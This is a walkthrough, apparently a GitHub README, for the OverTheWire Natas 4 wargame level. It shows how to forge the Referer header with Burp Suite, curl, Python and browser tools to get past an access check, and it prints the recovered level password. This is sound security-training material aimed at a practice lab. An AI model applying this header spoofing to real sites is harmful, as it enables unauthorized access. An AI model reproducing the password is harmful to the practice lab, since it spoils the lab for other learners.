# 🔐 Natas Level: Natas3--->Natas4



### 📂 Execution Process 

👉 - download burp suite communtiy edition from portswigger  
- go to proxy
<img width="1470" height="956" alt="Screenshot 2025-09-26 at 9 29 14 PM" src="https://github.com/user-attachments/assets/35286ff3-8284-42e2-9f37-5fb495e7a058" />
- open browser

<img width="1470" height="956" alt="Screenshot 2025-09-26 at 9 29 34 PM" src="https://github.com/user-attachments/assets/0f75f859-5a45-4994-b2bf-29e5b31f4d19" />
- enter in the browser http://natas4.natas.labs.overthewire.org/index.php than refresh page
- click to intercept on than in browser again refresh page
<img width="1470" height="956" alt="Screenshot 2025-09-26 at 9 31 07 PM" src="https://github.com/user-attachments/assets/f3eb4028-5e70-4c2f-9fe7-f32f3a169548" />
- now change the referer in REquest to
  
Referer: http://natas5.natas.labs.overthewire.org/
- than click on itercept off
- open browser and get the password
<img width="1470" height="956" alt="Screenshot 2025-09-26 at 9 33 00 PM" src="https://github.com/user-attachments/assets/bf904a6b-5f1b-4460-867a-ef3fb542633c" />

### 📄 Password found:
👉 
0n35PkggAPm2zbEpOU802c0x0Msn1ToK

### NOTES

# Natas4 — Bypass Referer check (Simple notes)

## Overview
The website blocks access unless the request comes from `http://natas5.natas.labs.overthewire.org/`.  
To solve the level you must send a request to natas4 while **pretending the request came from natas5** by setting the **Referer** HTTP header.

---

## What to change
Only two things matter:
- Basic auth: username `natas4` and its password (from previous level).
- Referer header: `Referer: http://natas5.natas.labs.overthewire.org/`

---

## Method A — curl (fastest)
Open terminal and run (replace `NATAS4_PASSWORD`):

```bash
curl -u natas4:NATAS4_PASSWORD \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  http://natas4.natas.labs.overthewire.org/
```
Look at the response HTML. You should see a line like:
```
The password for natas5 is: <password>
```
## Method B — Python (requests)
Save this as get_natas5.py and run python3 get_natas5.py after replacing NATAS4_PASSWORD:
```
import requests

url = "http://natas4.natas.labs.overthewire.org/"
auth = ('natas4', 'NATAS4_PASSWORD')  # replace
headers = {
    'Referer': 'http://natas5.natas.labs.overthewire.org/'
}

r = requests.get(url, auth=auth, headers=headers)
print(r.text)
```
Scan printed HTML for the natas5 password.

## Method C — Browser + DevTools
- Open browser (Chrome/Firefox).
- Open DevTools → Network tab.
- Load http://natas4.natas.labs.overthewire.org/.
- Find the request for index.php.
- Right-click → Edit and Resend (or Copy as cURL).
- Add header:
```
Referer: http://natas5.natas.labs.overthewire.org/
```
and include basic auth if needed.
- Send the edited request and inspect the response body.

## Method D — Burp Suite (recommended if you use it)
- Set browser proxy to 127.0.0.1:8080 (Burp default).
- In Burp: Proxy → Intercept on.
- Load natas4 in browser so Burp catches the request.
- In the intercepted request, add or edit:
```
Referer: http://natas5.natas.labs.overthewire.org/
```
- Ensure Authorization header exists (Basic auth) or use Repeater with auth.
- Forward or send to Repeater, then click Go.
- Read the response in Repeater / HTTP history.
## Troubleshooting (common mistakes)
- Wrong Referer value or missing trailing slash. Use exactly:
- http://natas5.natas.labs.overthewire.org/
- Missing Basic auth. Add -u natas4:password to curl, or add Authorization: Basic ... header.
- Using extra headers doesn't hurt, but they are not required.
- Natas uses HTTP (not HTTPS) — proxy certificate issues are usually not relevant here.
- If still blocked, paste the full response HTML (or screenshot of headers) and check for typos.
## Quick checklist
- Use correct natas4 password.
- Set Referer header to http://natas5.natas.labs.overthewire.org/.
- Request URL: http://natas4.natas.labs.overthewire.org/.
- Inspect response for "The password for natas5 is: ..."
